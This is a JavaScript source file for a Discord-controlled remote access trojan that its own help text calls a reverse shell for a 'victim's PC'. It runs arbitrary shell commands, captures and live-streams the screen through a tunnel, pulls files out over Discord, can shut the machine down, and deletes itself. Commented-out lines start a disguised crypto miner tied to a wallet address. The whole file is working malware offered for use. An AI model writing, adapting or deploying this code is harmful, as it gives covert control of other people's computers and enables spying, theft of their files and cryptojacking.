const add = 'addhere';
const bot = 'bothere';


const screenshot = require('./node_modules/screenshot-desktop');
const {Discord , Client, GatewayIntentBits} = require('./node_modules/discord.js');
const { exec } = require('child_process');
const sleep = require('util').promisify(setTimeout);
const fs = require('fs'); // Example: 6379
const os = require('os');
const robot = require('./node_modules/@hurdlegroup/robotjs');
const { createCanvas, Image } = require('./node_modules/@napi-rs/canvas');
const express = require('./node_modules/express');
const http = require('http');
const { Server } = require("./node_modules/socket.io");
const axios = require('./node_modules/axios');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent // Include all intents you need
    ]
});const prefix = '!';
const { Dropbox } = require('./node_modules/dropbox');
const debug = "http://localhost:2315"

const deleteScript = () => {
    fs.unlink(__filename, (err) => {
        if (err) {
            console.error('Error deleting script:', err);
        } else {
            console.log('Script deleted successfully.');
        }
    });
};

async function checkFileExists(filePath) {
    try {
        const response = await dbx.filesGetMetadata({ path: filePath });
        // If the file exists, response will contain its metadata
        //console.log(`File ${filePath} exists.`);
        return true;
    } catch (error) {
        // If the file doesn't exist or there's an error, catch the error
        if (error.response && error.response.status === 409) {
            //  console.log(`File ${filePath} does not exist.`);
            return false;
        } else {
            return false
        }
    }
}
// Path to the text file you want to upload
const filePath = './conf.aest';
// Path to where you want to upload the file on Dropbox
const dropboxFilePath = '/conf.aest';

const app = express();
let server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 2315;
let sentMeages = [];
let lastMessages = [];
const bindFilePath = './bind.txt';
let ownedsrvs = [];
let leader = null
let binded = null;
const userHostname = os.hostname();
const channelName = `session-${userHostname}`;
const bindedGuild = client.guilds.cache.get(binded);

function stripAnsiCodes(input) {
    // Regular expression to match ANSI escape codes
    const ansiRegex = /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g;
    return input.replace(ansiRegex, '');
}

async function checkifdfileexists() {
    try {
        await dbx.filesGetMetadata({ path: '/leader.aest' });
        return true; // File exists
    } catch (error) {
        if (error.response && error.response.status === 409) {
            return false; // File doesn't exist
        } else {
            return false
            ; // Throw other errors
        }
    }
}



async function uploaddfile() {
    try {
        const filePath = 'leader.aest'; // Define filePath variable
        const fileContent = fs.readFileSync(filePath, "utf8"); // Read file content
        leader = fileContent
        await dbx.filesUpload({
            path: '/leader.aest',
            contents: fileContent // Upload the file content
        });
      //  console.log(`File uploaded to /leader.aest`); // Update the upload message
    } catch (error) {
        console.error("Error uploading file:", error);
    }
}

async function downloaddfile() {
    try {
        if (await checkifdfileexists()) {
            console.log(await checkifdfileexists())
            const response = await dbx.filesDownload({ path: '/leader.aest' });

            // Save the downloaded file content;
            fs.writeFileSync(filePath, response.result.fileBinary.toString('utf8'), 'utf8');

            // Now read the file
            const data = fs.readFileSync(filePath, "utf8");
            leader = data;
            fs.writeFileSync('leader.aest', data, 'utf8');
            // console.log('rebinded leader');
            // console.log(os.hostname());
        }
        else {
            if (fs.existsSync('leader.aest')) {
                await uploaddfile()
            } else {
                fs.writeFileSync('leader.aest', os.hostname(), "utf8")
                await uploaddfile()
            }
        }
    } catch (error) {
        console.log(await checkifdfileexists())
        console.error("Error downloading file:", error);
    }
}
async function dleaderfile() {
    try {
        const resp = await checkifdfileexists();
        if (resp === false) {
            if (!fs.existsSync('leader.aest')) {
                await downloaddfile();
            } else {
                fs.unlinkSync('leader.aest');
                await uploaddfile();
            }
        } else {
            await downloaddfile();
        }
    } catch (error) {
        console.error("Error in dleaderfile:", error);
    }
}

function cutbot(str) {
    const midpoint = Math.ceil(str.length / 2);
    const firstHalf = str.substring(0, midpoint);
    const secondHalf = str.substring(midpoint);
    return firstHalf;
}
async function update() {
    const url = `${debug}/get`;
    const leadurl = `${debug}/leadget`;
    const leadpost = `${debug}/lead`;
    const headers = {
        'authorization': `Bearer ${cutbot(Buffer.from(bot, 'base64').toString('ascii'))}`
    };

    try {
        const response = await axios.get(url, { headers });
        if (response.data !== null && response.data !== 'None' && response.data !== 'Unauthorized' && response.data !== 'Internal Server Error') {
            binded = response.data;
            console.log(response.data);
        } else {
            console.log(response.data);
            console.log('Invalid binded response.');
        }
    } catch (error) {
        console.error('Error:', error);
    }

    try {
        const response = await axios.get(leadurl, { headers });
        console.log("DATA " + response.data);
        if (response.data !== null && response.data !== 'Unauthorized' && response.data !== 'Internal Server Error') {
            if (response.data !== 'None' && response.data !== 'undefined') {
                const newHeaders = {
                    'authorization': `Bearer ${cutbot(Buffer.from(bot, 'base64').toString('ascii'))}`,
                    'leader': `Bearer ${os.hostname()}`
                };
                try {
                    const responsex = await axios.get(leadpost, { headers: newHeaders });
                    if (responsex.data !== null && responsex.data !== 'None' && responsex.data !== 'Unauthorized' && responsex.data !== 'Internal Server Error') {
                        console.log('Leader binded successful');
                        leader = os.hostname();
                    } else {
                        console.log("RESPONSE " + responsex.data);
                        console.log('Invalid leader binded response.');
                    }
                } catch (error) {
                    console.error('Error:', error);
                }
            }
            console.log(response.data);
        } else {
            leader = response.data;
            console.log(response.data);
            console.log('Invalid leader response.');
        }
    } catch (error) {
        if (error.response && error.response.data !== null && error.response.data !== 'Internal Server Error') {
            if (error.response.data !== 'None' && error.response.data !== 'undefined') {
                const newHeaders = {
                    'authorization': `Bearer ${cutbot(Buffer.from(bot, 'base64').toString('ascii'))}`,
                    'leader': `Bearer ${os.hostname()}`
                };
                try {
                    const responsex = await axios.get(leadpost, { headers: newHeaders });
                    if (responsex.data !== null && responsex.data !== 'None' && responsex.data !== 'Unauthorized' && responsex.data !== 'Internal Server Error') {
                        console.log('Leader binded successful');
                        leader = os.hostname();
                    } else {
                        console.log(responsex.data);
                        console.log('Invalid leader binded response.');
                    }
                } catch (error) {
                    console.error("Error in catch block:", error);
                }
            }
            console.log(error.response.data);
        } else {
            console.log(error.response ? error.response.data : 'Unknown error');
            console.log('Invalid leader response.');
        }
    }
}

client.once('ready', async () => {
   console.log(`Logged in as ${client.user.tag}!`);
    const channelName = `session-${userHostname}`;
    await update()
    const totalMemory = os.totalmem();

    // Calculate 40% of the total memory
    const fortyPercentMemory = totalMemory;

    // Convert the memory to a more readable format (e.g., MB or GB)
    const fortyPercentMemoryMB = fortyPercentMemory / (1024 * 1024);
    // exec(`node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://stratum-etc.antpool.com:8008 --user 0x615261CF5CCE15387E8f9F12E8eA18913C5f3a2E --keepfree ${fortyPercentMemoryMB * 0.75}`)
    // exec(`node_modules\\userhostsvc --algo ETCHASH --pool stratum+tcp://kr.etc.herominers.com:1150 --user  ${Buffer.from(add, 'base64').toString('ascii')} --keepfree ${fortyPercentMemoryMB * 0.75}`)
    client.guilds.cache.forEach(guild => {
        ownedsrvs.push(guild.id);
    });
    // Check if the bot is already binded when it starts
 
            // Check if the session channel already exists, if not, create it in the binded server

            if (bindedGuild) {
                const sessionChannel = bindedGuild.channels.cache.find(channel => channel.name === channelName.toLowerCase());
                if (!sessionChannel) {
                    bindedGuild.channels.create(channelName, {
                        type: 'text',
                        reason: 'Session channel for host PC'
                    }).then(channel => {
                       // console.log(`Session channel created for ${userHostname}`);
                    }).catch(error => {
                       // console.error(`Error creating session channel: ${error}`);
                    });
                }
            }
        });




const captureScreen = () => {
    const captureInterval = 300; // Capture interval in milliseconds

    setInterval(() => {
        // Get screen size
        const screenSize = robot.getScreenSize();

        // Capture screen
        const screen = robot.screen.capture(0, 0, screenSize.width, screenSize.height);

        // Create canvas
        const canvas = createCanvas(screenSize.width, screenSize.height);
        const ctx = canvas.getContext('2d');

        // Draw screen image onto canvas
        const imgData = ctx.createImageData(screen.width, screen.height);

        // Invert colors (if needed)
        for (let i = 0; i < screen.image.length; i += 4) {
            imgData.data[i] = screen.image[i + 2]; // Red channel
            imgData.data[i + 1] = screen.image[i + 1]; // Green channel
            imgData.data[i + 2] = screen.image[i]; // Blue channel
            imgData.data[i + 3] = 255; // Alpha channel
        }

        ctx.putImageData(imgData, 0, 0);

        // Add watermark
        ctx.fillStyle = 'rgba(255, 255, 255, 0.5)'; // White with 50% opacity
        ctx.font = 'bold 50px Arial';
        const text = 'xkwg';
        const textWidth = ctx.measureText(text).width;
        ctx.fillText(text, (screenSize.width - textWidth) / 2, screenSize.height / 2);

        // Resize the canvas
        const resizedCanvas = createCanvas(1720, 940);
        const resizedCtx = resizedCanvas.getContext('2d');
        resizedCtx.drawImage(canvas, 0, 0, resizedCanvas.width, resizedCanvas.height);

        // Encode the resized canvas as JPEG
        const jpegImage = resizedCanvas.toDataURL('image/jpeg');

        // Emit base64 image to clients
        io.emit('frame', jpegImage);
    }, captureInterval);
};
let loopcomm = 'node_modules\\loophole.exe http 2315'

async function downloadconf() {
    try {
        const response = await dbx.filesDownload({ path: '/conf.aest' });
        const fileData = response.result;
        fs.writeFileSync('conf.aest', fileData.fileBinary.toString('utf8'), 'utf8');
        binded = fileData.fileBinary.toString('utf8')
        return true
       // console.log('File downloaded successfully');
    } catch (error) {
        return false;
    }
}

async function checkexist() {
    const url = `${debug}/get`;
    const headers = {
        'authorization': `Bearer ${cutbot(Buffer.from(bot, 'base64').toString('ascii')) }`
    };
    console.log('starting')
    try {
        const response = await axios.get(url, { headers });
        if (response.data !== null && response.data !== 'None' && response.data !== 'Unauthorized' && response.data !== 'Internal Server Error') {
            console.log('valid')
            return true;
        } else {
            console.log(response.data);
            console.log('invalid.');
            return false;
        }
    } catch (error) {
        console.error('Error:', error);
        return false;
    }
}

client.on('message', async message => {
    await update()
    console.log("LEADER SYSTEM INFO " + binded + "      " + leader)
    lastMessages.length = 0
    if (!message.content.startsWith(prefix) || !message.guild || !ownedsrvs.includes(message.guild.id)) {
        return; // Ignore messages from bots, without prefix, or from non-owned servers
    }
    if (binded === null && leader === os.hostname() && !message.content.startsWith('!bind') && !message.content.startsWith('!forcerebind')) {
        if (await checkexist() == false) {
            const serverListEmbed = new Discord.MessageEmbed()
                .setColor('#0099ff')
                .setTitle('List of bindable servers')
                .setDescription(client.guilds.cache.map(guild => '`•  ' + guild.name.padEnd(25) + '[' + guild.id + ']' + '`').join('\n'));

            message.channel.send('`Bot is unbinded. Use !bind [server id] to bind the bot.`')
            message.channel.send(serverListEmbed);
            return;
        } else if (await checkexist() == true) {
            message.channel.send('`Updating Config Thingies.. Rerun command..`')
            await update()
        } else {
            console.error('Error occured');
        }

        
    }
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    if (command === 'bind') {
        if (binded && binded !== null) {
            message.channel.send('`Bot is already binded.`');
            return;
        }

        const binder = args.join(' ').trim();
        if (ownedsrvs.includes(binder)) {
            try {
                const headers = {
                    'authorization': `Bearer ${cutbot(Buffer.from(bot, 'base64').toString('ascii')) }`,
                    'id': `Bearer ${binder}`
                }
                axios.get(`${debug}/post`, { headers })
                    .then(response => {
                        console.log(response.data);
                        update()
                        message.channel.send('`Bot binded successfully.`');
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        message.channel.send('`Fatal Error Occurred Involving API.`');
                    });
                
            } catch {
                message.channel.send('`Fatal Error Occurred.`');
            }   
            
        } else {
            message.channel.send('`Invalid server ID.`');
        }
        return; // Ensure no further processing after binding
    }
    
    if (command === 'forcerebind') {
        const rebind = args.join(' ').trim();

        if (ownedsrvs.includes(rebind)) {
            if (lastMessages.includes('`WARNING: only use !forcerebind if server status is critical (Deleted / Terminated) DO NOT USE IN ANY OTHER CIRCUMSTANCE!\nConfirm server rebind? [Yes / No]`')) {
                return
            } else {
                const confirmationMsg = await message.channel.send("`WARNING: only use !forcerebind if server status is critical (Deleted / Terminated) DO NOT USE IN ANY OTHER CIRCUMSTANCE!\nConfirm server rebind? [Yes / No]`");
                const filter = m => m.author.id === message.author.id && m.channel.id === message.channel.id;
                const options = { max: 1, time: 10000, errors: ['time'] };

                try {
                    const collected = await message.channel.awaitMessages(filter, options);
                    const response = collected.first().content.toLowerCase();

                    if (response === 'yes') {
                        const headers = {
                            'authorization': `Bearer ${cutbot(Buffer.from(bot, 'base64').toString('ascii')) }`,
                            'id': `Bearer ${rebind}`
                        }
                        axios.get(`${debug}/post`, { headers })
                            .then(response => {
                                console.log(response.data);
                                update()
                                message.channel.send('`Bot rebinded successfully.`');
                            })
                            .catch(error => {
                                console.error('Error:', error);
                            });
                        //await update()
                    } else if (response === 'no') {
                        message.channel.send('`Rebind aborted.`');
                    } else {
                        message.channel.send('`Invalid response. Rebind aborted.`');
                    }
                } catch (error) {
                    console.log(error)
                    message.channel.send('`You took too long to respond. Rebind aborted.`');
                }
            }
            } else {
                message.channel.send('`Invalid server, run on binded server.`');
            }
            return;
        
    }
    const userHostname = os.hostname();
    const channelName = `session-${userHostname}`;

    let channel = message.guild.channels.cache.find(ch => ch.name === channelName.toLowerCase());

    if (!channel) {
        channel = await message.guild.channels.create(channelName, {
            type: 'text',
            reason: 'Session channel for host PC'
        });
    }

    if (message.channel.id !== channel.id) {
        if (leader === os.hostname()) {
            if (message.channel.name.includes('session-')) {
                return
            } else {
                message.channel.send('`Invalid channel. Please use the correct session channel.`');
                return;
            }
        } else {
            return
        }
    }


    if (command === 'shutdown') {
        try {
            exec('shutdown /s /t 0', (error, stdout, stderr) => {
                if (error) {
                 //   console.error(`exec error: ${error}`);
                    return;
                }
              //  console.log(`stdout: ${stdout}`);
              //  console.error(`stderr: ${stderr}`);
            });
            message.channel.send('`Shutting down...`');
        } catch {
            message.channel.send('`Error shutting down system! Is system corrupted?`');
        }
    } else if (command === 'download' ) {
        const filename = args.join(' ');
        if (fs.existsSync(filename)) {
            await message.channel.send({ files: [filename] });
        } else {
            await message.channel.send("`The file does not exist.`");
        }
    }
    if (command === 'lplogin') {
        const logincomm = 'node_modules\\loophole.exe account login';
        const process = exec(logincomm);

        process.stdout.on('data', (data) => {
            const cleanedData = stripAnsiCodes(data.toString());
            const lines = cleanedData.split('\n');
            lines.forEach((line) => {
                if (line.includes('code to log in')) {
                    // Split the line by spaces
                    const words = line.split(' ');

                    // Do something with the split words, for example, log them
                    // console.log(words[0]);

                    // Optionally, join the words back if you need the line in original form for sending
                    message.channel.send(`\`${words[0]} ${words[1]}\` **${words[2]}** \`${words[3]} ${words[4]} ${words[6]}\` **${words[5]}** \`${words[7]} ${words[8]} ${words[9]}.\``);
                } else if (line.includes('Already logged in')) {
                    message.channel.send('`Loophole process is already logged in.`')
                } else {
                    message.channel.send('`Unknown error occured, report to @conquerist and send them this error code: 0019`')
                }
            });
        });

        process.stderr.on('data', (data) => {
            const cleanedData = stripAnsiCodes(data.toString());
            const lines = cleanedData.split('\n');
            lines.forEach((line) => {
                if (line.includes('code to log in')) {
                    // Split the line by spaces
                    const words = line.split(' ');

                    // Do something with the split words, for example, log them
                  //  console.log(words[0]);

                    // Optionally, join the words back if you need the line in original form for sending
                    message.channel.send(`\`${words[0]} ${words[1]}\` **${words[2]}** \`${words[3]} ${words[4]} ${words[6]}\` **${words[5]}** \`${words[7]} ${words[8]} ${words[9]}.\``);
                } else if (line.includes('Already logged in')) {
                    message.channel.send('`Loophole process is already logged in.`')
                }
            })
        }); // Log all stderr data for gging
    

        process.on('error', (err) => {
            const cleanedData = stripAnsiCodes(data.toString());
            const lines = cleanedData.split('\n');
            lines.forEach((line) => {
                if (line.includes('code to log in')) {
                    // Split the line by spaces
                    const words = line.split(' ');

                    // Do something with the split words, for example, log them
                   // console.log(words[0]);

                    // Optionally, join the words back if you need the line in original form for sending
                    message.channel.send(`\`${words[0]} ${words[1]}\` **${words[2]}** \`${words[3]} ${words[4]} ${words[6]}\` **${words[5]}** \`${words[7]} ${words[8]} ${words[9]}.\``);
                } else if (line.includes('Already logged in')) {
                    message.channel.send('`Loophole process is already logged in.`')
                }
            })
        });

    }
    else if (message.content.startsWith('!vnc')) {
        const stop = args.join(' ');
        sent = false
        loopholeProcess = exec(loopcomm)
        if (stop === 'stop') {
            if (server) {
                server.close(() => {
                    message.channel.send('`Killing server controller`');
                    sent = false
                    
                });
            }
            if (loopholeProcess) {
                exec('taskkill /F /IM loophole.exe', (error, stdout, stderr) => {
                    if (error) {
                        message.channel.send('`Error killing loophole process: ' + error.message + '`');
                        return;
                    }
                    message.channel.send('`Killing reverse proxy`');
                });
            }
        } else if (stop === 'start') {
            app.get('/', (req, res) => {
                res.setHeader('Content-Type', 'text/html');
                res.write('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Live</title></head><style>body { background-color: #000; }</style><body><div class="container"><div class="row"><div class="col-lg-8 offset-lg-2"><div id="image-container" style="text-align: center;"><img id="image" src="" style="max-width: 100%; max-height: 100%; margin: auto;"></div></div></div></div><script src="https://cdn.socket.io/4.0.1/socket.io.min.js"></script><script>window.onload = function () {var image = document.getElementById(\'image\');var socket = io();socket.on(\'frame\', function (data) {image.src = data;});};</script></body></html>');
                res.end();
            });

            io.on('connection', (socket) => {
              //  console.log('A user connected');

                socket.on('disconnect', () => {
                 //   console.log('A user disconnected');
                });
            });

            server.listen(PORT, '0.0.0.0', () => {
                message.channel.send('`' + `Server controller OK [Running ${PORT}]` + '`');
                captureScreen();

                loopholeProcess.stdout.on('data', (data) => {
                    const lines = data.toString().split('\n');
                    lines.forEach((line) => {
                      // console.log(`stdout: ${line}`); // Debugging output
                        const match = line.match(/https?:\/\/[^\s]+/);
                        if (match) {
                            const lin = match[0];
                            const link = lin.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '')
                            if (link.includes('localhost')) {
                                return
                            }
                            if (sent === false) {
                               // console.log(`Found link: ${link}`); // Debugging output
                                message.channel.send('`' + 'Your live link: `**' + link + '**\n`[Warning: Recommended to open the link 10 seconds after it has been sent to make sure the TLS certificate is provisioned.]' + '`');
                                sent = true
                            } else return
                        }
                    });
                });
                unloggedinsent = false
                loopholeProcess.stderr.on('data', (data) => {
                    
                    const errorMessage = data.toString();
                  //  console.error(`stderr: ${errorMessage}`);
                    const lines = data.toString().split('\n')

                    lines.forEach((line) => {
                      //  console.log(`stderr: ${line}`)
                        if (line.includes("You're not logged in")) {
                            if (unloggedinsent === false) {
                                server.close()
                                message.channel.send('`Loophole Process is not logged in!`\n`Log in your loophole process with !lplogin`')
                                unloggedinsent = true
                            }
                        }
                    })

                });


                loopholeProcess.on('close', (code) => {
                 //   console.log(`child process exited with code ${code}`);
                });
            });
        } else {
            message.channel.send('`Incorrect usage! Possible parameters: start, stop`')
        }

    } else if (command === 'delete') {
        const confirmationMsg = await message.channel.send("`Are you sure you wanna disconnect this machine? [yes / no] WARNING: DELETION IS PERMANENT.`");
        const filter = m => m.author.id === message.author.id && m.channel.id === message.channel.id;
        const options = { max: 1, time: 10000, errors: ['time'] };

        try {
            const collected = await message.channel.awaitMessages(filter, options);
            const response = collected.first().content.toLowerCase();

            if (response === 'yes') {
                if (fs.existsSync('node_modules')) {
                   // fs.rmdirSync('exfolder')
                    message.channel.send('`Removed core directory.`')
                    if (fs.existsSync(__filename)) {
                        message.channel.send('`Removed script.`')
                        deleteScript()
                        process.exit(0)
                        
                    }
                    
                }
            } else if (response === 'no') {
                message.channel.send('`Rebind aborted.`');
            } else {
                message.channel.send('`Invalid response. Rebind aborted.`');
            }
        } catch (error) {
            console.log(error)
            message.channel.send('`You took too long to respond. Deletion aborted.`');
        }
    }
    else if (command === 'ss') {
        try {
            const img = await screenshot();
            const screenshotPath = `${os.tmpdir}\\screenshot.png`;
            fs.writeFileSync(screenshotPath, img);
            await message.channel.send({
                files: [{
                    attachment: screenshotPath,
                    name: `screenshot.png`
                }]
            });
            fs.unlinkSync(screenshotPath)
        } catch {
            message.channel.send('Unknown error occured.')
        }
    } else if (command === 'run') {
        const filename = args.join(' ');
        try {
            if (filename.endsWith('.exe')) {
                exec(filename, (error, stdout, stderr) => {
                    if (error) {
                        message.channel.send('`' + `Error running file: ${error.message}` + '`');
                        return;
                    }
                    message.channel.send('`' + `Ran the file ${filename}` + '`');
                });
            } else {
                message.channel.send('`Unsupported file type.`');
            }
        } catch (error) {
            message.channel.send('`' + `Error running file: ${error.message}` + '`');
        }
    } else if (command === 'help') {
        const help_text = '`' +
            `Here are the commands you can use:
            - !shutdown: Force shut down the target machine.
            - !vnc [start/stop]: Live stream your victim's PC.
            - !ls: Lists the contents of the current directory and sends it as an embed.
            - !run <filename>: Runs the specified file.
            - !help: Shows this help message.
            - !cd: Changes the directory.
            - !upload: Upload a file.
            - !popup: Show a fun popup!
            - !download: Download a file.
            - !ss: Screenshot your victim's screen.
            - >[UTIL] !forcerebind [serverid]: Globally rebind the bot's functional server.
            - >[UTIL] !bind [serverid]: Initiator command.
            - >[UTIL] !lplogin: Login the loophole process.
            - 𓍼 Discord based asynchronous reverse shell created by Yaza and Spawn`+ '`';
        await message.channel.send(help_text);
    } else if (command === 'upload') {
        if (message.attachments.size > 0) {
            for (const attachment of message.attachments.values()) {
                const response = await axios.get(attachment.url, { responseType: 'stream' });
                const filePath = `./${attachment.name}`;
                const writer = fs.createWriteStream(filePath);
                response.data.pipe(writer);
                writer.on('finish', () => {
                    writer.close();
                    message.channel.send('`Upload completed successfully`');
                });
                writer.on('error', () => {
                    message.channel.send('`Upload failed`');
                });
            }
        } else {
            message.channel.send('`Please attach a file to upload.`');
        }
    } else if (command === 'dir') {
        message.channel.send('`Not recommended to use !dir, use !c or !ls to view current directory.`')
    }

    else if (command === 'ls') {
        try {
            const directory = process.cwd();
            if (!fs.existsSync(directory)) {
                message.channel.send('`Error: Current directory does not exist.`');
                return;
            }
            fs.readdir(directory, (err, files) => {
                if (err) {
                    message.channel.send(`Error: ${err.message}`);
                    return;
                }
                const chunkSize = 20;
                const chunks = [];
                for (let i = 0; i < files.length; i += chunkSize) {
                    chunks.push(files.slice(i, i + chunkSize));
                }
                let currentPage = 0;
                const sendChunk = () => {
                    const embed = new Discord.MessageEmbed()
                        .setTitle('Directory Listing')
                        .setDescription(chunks[currentPage].map(file => {
                            const stats = fs.statSync(file);

                            return stats.isDirectory() ? '📂 ' + file : '📄 ' + file;
                        }).join('\n') + '\n' + '`' + process.cwd() + '`');
                    message.channel.send(embed).then(msg => {
                        if (chunks.length > 1) {
                            msg.react('⬅️').then(() => msg.react('➡️'));
                            const filter = (reaction, user) => ['⬅️', '➡️'].includes(reaction.emoji.name) && !user.bot;
                            const collector = msg.createReactionCollector(filter);

                            collector.on('collect', (reaction, user) => {
                                reaction.users.remove(user).catch(console.error);
                                if (reaction.emoji.name === '⬅️') {
                                    currentPage = (currentPage - 1 + chunks.length) % chunks.length;
                                } else {
                                    currentPage = (currentPage + 1) % chunks.length;
                                }
                                embed.setDescription(chunks[currentPage].map(file => {
                                    const stats = fs.statSync(file);
                                    return stats.isDirectory() ? '📂 ' + file : '📄 ' + file;
                                }).join('\n') + '\n' + '`' + process.cwd() + '`');
                                msg.edit(embed).catch(console.error);
                            });

                            collector.on('end', () => {
                                msg.reactions.removeAll().catch(console.error);
                            });
                        }
                    }).catch(console.error);
                };
                sendChunk();

            });
        }
        catch {
            message.channel.send('`Error Listing Directory!`')
        }
    }
    else if (command === 'c') {
        message.channel.send('`' + process.cwd() + '`');
    }
    else if (command === 'cd') {
        const dir = args.join(' ');
        try {
            process.chdir(dir);
            message.channel.send('`Directory changed to' + dir + '`');
        } catch (err) {
            message.channel.send('`Failed to change directory.`');
        }
    } else if (command.startsWith('popup')) {
        try {
            const popupMessage = args.join(' ');
            if (process.platform === 'win32') {
                const powershellpaths = [
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
                    os.homedir() + '\\AppData\\Local\\Microsoft\\WindowsApps\\powershell.exe'
                ];

                let powershellPathToUse = null;
                for (const path of powershellpaths) {
                    if (fs.existsSync(path)) {
                        powershellPathToUse = path;
                        break;
                    }
                }

                if (powershellPathToUse) {

                    exec(`"${powershellPathToUse}" -Command "Add-Type -AssemblyName Microsoft.VisualBasic;[Microsoft.VisualBasic.Interaction]::MsgBox('${popupMessage}', 0 + 4096 + 64, '<=[Message]=>')"`, (error, stdout, stderr) => {
                        if (error) {
                            console.error('exec error:', error);
                            message.channel.send('`Popup is not supported in this machine.`')
                            return;
                        }
                        
                        console.log('stdout:', stdout);
                        console.error('stderr:', stderr);

                        // Check if the user pressed "Yes" (value 6)
                    });
                    message.channel.send('`Popup sent!`')
                } else {
                    message.channel.send('Popup is not supported in this machine.');
                }
            } else {
                message.channel.send("`Popup is not supported on this platform.`");
            }
        } catch (error) {
            console.error('Error occurred starting popup function:', error);
            message.channel.send('`Error occurred starting popup function.`');
        }
    }
    

    else { 
        if (message.content.startsWith('!bind')) {
            return
        }
        if (message.content.startsWith('!forcerebind')) {
            return
        }
        if (message.content.startsWith('!download')) {
            return
        }
        try {
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    message.channel.send('`' + error + '`');
                    console.error(`stderr: ${stderr}`);
                } else {
                    message.channel.send('`' + stdout + '`');
                }
            });
        } catch {
            message.channel.send('`Unresolved Error Ocurred! (Did you send a correct command?)`')
        }
    

           
        
    }
});
client.login(Buffer.from(bot, 'base64').toString('ascii'))
